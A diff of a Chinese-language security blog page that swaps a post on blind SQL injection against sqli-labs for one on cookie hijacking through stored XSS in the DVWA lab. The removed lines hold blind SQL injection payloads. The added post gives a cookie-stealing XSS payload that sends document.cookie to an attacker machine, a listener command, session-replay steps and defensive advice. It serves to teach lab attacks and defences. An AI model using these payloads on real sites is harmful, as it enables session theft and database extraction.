@@ -20,37 +20,40 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"byroins.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.28.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":2,"unescape":true,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="Environment: PHP 7.3.4 + MySQL 5.7.26   Lab: sqli-labs Less-8   1.0 布尔盲注&amp;延时盲注函数在布尔注入及延时注入中, 常用函数如下:    序号 函数 注释    1 if(条件,返回值1,返回值2) 判断条件, 若为真返回(返回值1), 否则为返回值2   2 substr(str,1,2) 从第1位开始截取’str’的">
+    <meta name="description" content="Environment: PHP 7.3.4 + MySQL 5.7.26   Lab: DVWA   1.0 Cookie劫持1.1 基础部分01 什么是Cookie? 用户在浏览器中输入账号密码登录网站后, 接下来的每次请求, 服务器如何知道 “ 这个请求是刚才登录的那个用户发来的 “ ?  通过Cookie  自动携带: 浏览器每次向同一域名发送请求时, 会自动附带上该域名下的所有 Coo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Boolean and Time-blind-Injection">
-<meta property="og:url" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/index.html">
+<meta property="og:title" content="Cookie-Hijacking">
+<meta property="og:url" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/index.html">
 <meta property="og:site_name" content="Byron">
-<meta property="og:description" content="Environment: PHP 7.3.4 + MySQL 5.7.26   Lab: sqli-labs Less-8   1.0 布尔盲注&amp;延时盲注函数在布尔注入及延时注入中, 常用函数如下:    序号 函数 注释    1 if(条件,返回值1,返回值2) 判断条件, 若为真返回(返回值1), 否则为返回值2   2 substr(str,1,2) 从第1位开始截取’str’的">
+<meta property="og:description" content="Environment: PHP 7.3.4 + MySQL 5.7.26   Lab: DVWA   1.0 Cookie劫持1.1 基础部分01 什么是Cookie? 用户在浏览器中输入账号密码登录网站后, 接下来的每次请求, 服务器如何知道 “ 这个请求是刚才登录的那个用户发来的 “ ?  通过Cookie  自动携带: 浏览器每次向同一域名发送请求时, 会自动附带上该域名下的所有 Coo">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/1.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/2.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/3.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/4.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/5.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/6.png">
-<meta property="article:published_time" content="2026-07-09T14:00:00.000Z">
-<meta property="article:modified_time" content="2026-07-13T08:41:06.818Z">
+<meta property="og:image" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/1.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/2.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/3.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/4.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/5.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/6.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/7.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/8.png">
+<meta property="article:published_time" content="2026-07-22T14:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-22T08:08:21.122Z">
 <meta property="article:author" content="Byron">
-<meta property="article:tag" content="Time">
-<meta property="article:tag" content="boolean">
-<meta property="article:tag" content="sql-injection">
-<meta property="article:tag" content="sqli-labs">
+<meta property="article:tag" content="cookie">
+<meta property="article:tag" content="dvwa">
+<meta property="article:tag" content="session">
+<meta property="article:tag" content="xss">
+<meta property="article:tag" content="存储型xss">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/1.png">
+<meta name="twitter:image" content="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/1.png">
 
 
-<link rel="canonical" href="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/">
+<link rel="canonical" href="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/","path":"2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/","title":"Boolean and Time-blind-Injection"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/","path":"2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/","title":"Cookie-Hijacking"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Boolean and Time-blind-Injection | Byron</title>
+<title>Cookie-Hijacking | Byron</title>
   
 
 
@@ -174,7 +177,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-0-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">1.0 布尔盲注&amp;延时盲注函数</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-0-Cookie%E5%8A%AB%E6%8C%81"><span class="nav-number">1.</span> <span class="nav-text">1.0 Cookie劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 基础部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-Cookie%E7%AA%83%E5%8F%96%E5%AE%9E%E6%88%98"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 Cookie窃取实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 防御建议</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -235,7 +238,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/private/icon1.png">
@@ -248,12 +251,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Boolean and Time-blind-Injection | Byron">
+      <meta itemprop="name" content="Cookie-Hijacking | Byron">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Boolean and Time-blind-Injection
+          Cookie-Hijacking
         </h1>
 
         <div class="post-meta-container">
@@ -263,15 +266,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
+      
 
-      <time title="Created: 2026-07-09 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-09T22:00:00+08:00">2026-07-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-07-13 16:41:06" itemprop="dateModified" datetime="2026-07-13T16:41:06+08:00">2026-07-13</time>
+      <time title="Created: 2026-07-22 22:00:00 / Modified: 16:08:21" itemprop="dateCreated datePublished" datetime="2026-07-22T22:00:00+08:00">2026-07-22</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -283,7 +280,7 @@
         </span>
           , 
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
+          <a href="/categories/web-security/xss/" itemprop="url" rel="index"><span itemprop="name">xss</span></a>
         </span>
     </span>
 
@@ -307,89 +304,168 @@
 <p>Environment: PHP 7.3.4 + MySQL 5.7.26</p>
 </blockquote>
 <blockquote>
-<p>Lab: sqli-labs Less-8</p>
+<p>Lab: DVWA</p>
 </blockquote>
 <hr>
-<h2 id="1-0-布尔盲注-延时盲注函数"><a href="#1-0-布尔盲注-延时盲注函数" class="headerlink" title="1.0 布尔盲注&amp;延时盲注函数"></a>1.0 布尔盲注&amp;延时盲注函数</h2><p><strong>在布尔注入及延时注入中, 常用函数如下:</strong></p>
+<h2 id="1-0-Cookie劫持"><a href="#1-0-Cookie劫持" class="headerlink" title="1.0 Cookie劫持"></a>1.0 Cookie劫持</h2><h3 id="1-1-基础部分"><a href="#1-1-基础部分" class="headerlink" title="1.1 基础部分"></a>1.1 基础部分</h3><p><strong>01 什么是Cookie?</strong></p>
+<p>用户在浏览器中输入账号密码登录网站后, 接下来的每次请求, 服务器如何知道 “ 这个请求是刚才登录的那个用户发来的 “ ?  <code>通过Cookie</code></p>
+<ul>
+<li><strong>自动携带</strong>: 浏览器每次向同一域名发送请求时, 会自动附带上该域名下的所有 Cookie</li>
+<li><strong>键值对结构</strong>: <code>Cookie: name=value; name2=value2</code></li>
+<li><strong>作用范围</strong>: 由 <code>Domain</code> 和 <code>Path</code> 属性控制</li>
+<li><strong>有效期</strong>: 由 <code>Expires</code> 或 <code>Max-Age</code> 决定, 若不设置则为“会话 Cookie”, 关闭浏览器即失效</li>
+</ul>
+<p><strong>攻击者关心的三个安全属性</strong>：</p>
 <table>
 <thead>
 <tr>
-<th>序号</th>
-<th>函数</th>
-<th>注释</th>
+<th>属性</th>
+<th>作用</th>
+<th>攻击视角</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>1</td>
-<td>if(条件,返回值1,返回值2)</td>
-<td>判断条件, 若为真返回(返回值1), 否则为返回值2</td>
+<td><code>HttpOnly</code></td>
+<td>禁止 JavaScript 读取</td>
+<td>开启后 <code>document.cookie</code> 读不到, 无法窃取 Cookie, 但仍可做钓鱼, CSRF</td>
 </tr>
 <tr>
-<td>2</td>
-<td>substr(str,1,2)</td>
-<td>从第1位开始截取’str’的长度为2 (st)</td>
+<td><code>Secure</code></td>
+<td>仅通过 HTTPS 传输</td>
+<td>未设此属性时, HTTP 连接可被中间人窃听</td>
 </tr>
 <tr>
-<td>3</td>
-<td>length(database())&#x3D;8</td>
-<td>判断数据库名称长度是否为8</td>
-</tr>
-<tr>
-<td>4</td>
-<td>ascii(s)&#x3D;115</td>
-<td>判断字母’s’编码是否为115</td>
-</tr>
-<tr>
-<td>5</td>
-<td>sleep(n)</td>
-<td>延时输出结果,n为秒数</td>
+<td><code>SameSite</code></td>
+<td>控制跨站请求是否携带 Cookie</td>
+<td><code>Strict</code> 最严, <code>Lax</code> 允许 GET 跨站携带, <code>None</code> 全放行</td>
 </tr>
 </tbody></table>
+<p><strong>02 什么是Session?</strong></p>
+<p>Session 是保存在<strong>服务器端</strong>的用户会话数据. 它的工作流程：</p>
+<ol>
+<li>用户登录成功 → 服务器创建一个 Session, 并生成唯一的 Session ID</li>
+<li>服务器把 Session ID 通过 <code>Set-Cookie</code> 头发给浏览器</li>
+<li>浏览器保存这个 Cookie, 后续每次请求自动带回</li>
+<li>服务器根据请求中的 Session ID, 查找对应的 Session 数据, 识别用户身份</li>
+</ol>
+<p><strong>Session 与 Cookie 的关系</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>概念</th>
+<th>存储位置</th>
+<th>相当于</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Session</td>
+<td>服务器端</td>
+<td>保险柜, 存放用户的所有会话数据</td>
+</tr>
+<tr>
+<td>Cookie(中的 Session ID)</td>
+<td>浏览器端</td>
+<td>保险柜的钥匙，证明你就是你</td>
+</tr>
+<tr>
+<td>Session 劫持</td>
+<td>拿到钥匙</td>
+<td>攻击者窃取 Cookie 后, 用钥匙打开受害者的保险柜</td>
+</tr>
+</tbody></table>
+<p><strong>攻击者视角核心认知</strong>: Session 数据本身不会被窃取(它在服务器里), 但只要拿到 Cookie 里的 Session ID, 就能冒充受害者.</p>
+<p><strong>03 Cookie劫持核心:</strong></p>
+<p>如果攻击者通过 XSS 漏洞获取了受害者的 Cookie, 就等于拿到了受害者的 “临时身份证” 攻击者可以将这个 Cookie 写入自己的浏览器, 完全以受害者的身份登录网站, 无需知道用户名和密码.</p>
 <hr>
-<p><strong>手工注入流程(布尔盲注):</strong></p>
-<p><strong>01 判断数据库字符长度</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/1.png"></p>
+<h3 id="1-2-Cookie窃取实战"><a href="#1-2-Cookie窃取实战" class="headerlink" title="1.2 Cookie窃取实战"></a>1.2 Cookie窃取实战</h3><p><strong>01 环境准备:</strong></p>
+<ul>
+<li>Windows-DVWA靶场<ul>
+<li>Level-Low</li>
+</ul>
+</li>
+<li>Kali 攻击机<ul>
+<li>IP: 10.0.0.201</li>
+</ul>
+</li>
+</ul>
+<p><strong>02 攻击步骤梳理:</strong></p>
+<ul>
+<li>确认XSS漏洞存在</li>
+<li>编写Cookie窃取Payload</li>
+<li>攻击机启动HTTP服务器</li>
+<li>Payload注入</li>
+<li>模拟受害者访问</li>
+<li>Cookie会话劫持</li>
+</ul>
+<p>以下实操附截图:</p>
+<ul>
+<li><p><strong>漏洞确认</strong></p>
+<p><img data-src="/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/1.png"></p>
 <blockquote>
-<p>当前数据库名长度&#x3D;8</p>
+<p>如上图, 选择存储型XSS并构造Payload提交</p>
 </blockquote>
-<p><strong>02 猜解数据库名,(采用ascii编码)</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(), 1,1))=115 --+</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/2.png"></p>
+<p><img data-src="/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/2.png"></p>
 <blockquote>
-<p>猜测正确,第一位确实为 ‘115’, 小写字母 ‘s’, 继续猜剩余7位即可</p>
+<p>成功弹窗, 证明漏洞存在</p>
 </blockquote>
-<p><strong>03 猜解表名长度</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/3.png"></p>
+<p><img data-src="/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/3.png"></p>
 <blockquote>
-<p>当前数据库第一个表, 表名长度&#x3D;6</p>
+<p>同时数据库成功写入一条记录</p>
 </blockquote>
-<p><strong>04 猜解数据表名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1,1))=114 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Payload构造</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;new Image().src=&#x27;http://10.0.0.201:8000/?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Kali启动HTTP服务</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/4.png"></p>
+<p><img data-src="/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/4.png"></p>
 <blockquote>
-<p>当前库第一个表,第一个字母并非 ‘114’ , ‘r’</p>
+<p>进入监听…</p>
 </blockquote>
-<p><strong>05 猜解列名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1), 1,1))=114 --+</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/5.png"></p>
+</li>
+<li><p><strong>Payload注入</strong></p>
+<ul>
+<li>如下图, 在注入内容时, 网站可能会做限制, 调用开发者工具修改对应属性</li>
+</ul>
+<p><img data-src="/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/5.png"></p>
 <blockquote>
-<p>users 表中第一个字段首字母并非 ‘114’,’r’</p>
+<p>修改 maxlength&#x3D;”500” 并提交</p>
 </blockquote>
-<p>…</p>
-<p>盲注每一步都需要猜解大量字符, 以上是标准Payload, 实际过程中使用二分法思路结合ASCII编码进行.</p>
-<p><strong>延时盲注:</strong></p>
-<p>延时盲注即在布尔盲注的语句中添加条件判断if (IF(条件, sleep(秒数), 0)) , 标准格式如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())=8,sleep(3),0)--+</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/6.png"></p>
-<p>以上语句为真, 执行sleep(3) , 如上图, 浏览器会有加载标识</p>
+<p><img data-src="/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/6.png"></p>
+<blockquote>
+<p>数据库成功写入记录</p>
+</blockquote>
+</li>
+<li><p><strong>受害者访问</strong></p>
+<ul>
+<li>新开页面登录靶场</li>
+</ul>
+</li>
+<li><p><strong>Cookie劫持成功</strong></p>
+<p><img data-src="/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/7.png"></p>
+<blockquote>
+<p>如上图, 受害者访问后, 服务成功获取用户的cookie数据, 若要登录该账户, 只需做以下操作</p>
+</blockquote>
+<ul>
+<li>调用开发者工具 → Application → Storage(Cookies) → 替换PHPSESSID的Value</li>
+</ul>
+<p><img data-src="/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/8.png"></p>
+<blockquote>
+<p>成功执行后刷新页面</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="1-3-防御建议"><a href="#1-3-防御建议" class="headerlink" title="1.3 防御建议"></a>1.3 防御建议</h3><ol>
+<li>对输出进行 HTML 实体编码, 防止 XSS 注入</li>
+<li>Cookie 设置 <code>HttpOnly</code> 属性, 禁止 JavaScript 读取</li>
+<li>Cookie 设置 <code>Secure</code> 属性, 仅 HTTPS 传输</li>
+<li>Cookie 设置 <code>SameSite=Lax</code> 或 <code>Strict</code>, 限制跨站携带</li>
+<li>对用户输入长度做后端校验, 不依赖前端限制</li>
+</ol>
+<blockquote>
+<p>以上防御措施可从根本阻断 XSS 注入, Cookie 窃取及会话劫持攻击链</p>
+</blockquote>
 
     </div>
 
@@ -416,24 +492,22 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
-              <a href="/tags/sql-injection/" rel="tag"># sql-injection</a>
-              <a href="/tags/boolean/" rel="tag"># boolean</a>
-              <a href="/tags/Time/" rel="tag"># Time</a>
+              <a href="/tags/xss/" rel="tag"># xss</a>
+              <a href="/tags/cookie/" rel="tag"># cookie</a>
+              <a href="/tags/session/" rel="tag"># session</a>
+              <a href="/tags/dvwa/" rel="tag"># dvwa</a>
+              <a href="/tags/%E5%AD%98%E5%82%A8%E5%9E%8Bxss/" rel="tag"># 存储型xss</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/" rel="prev" title="Error Injection">
-                  <i class="fa fa-angle-left"></i> Error Injection
+                <a href="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/" rel="prev" title="XSS-Bypass-Decision-Tree">
+                  <i class="fa fa-angle-left"></i> XSS-Bypass-Decision-Tree
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/" rel="next" title="SQLMap">
-                  SQLMap <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
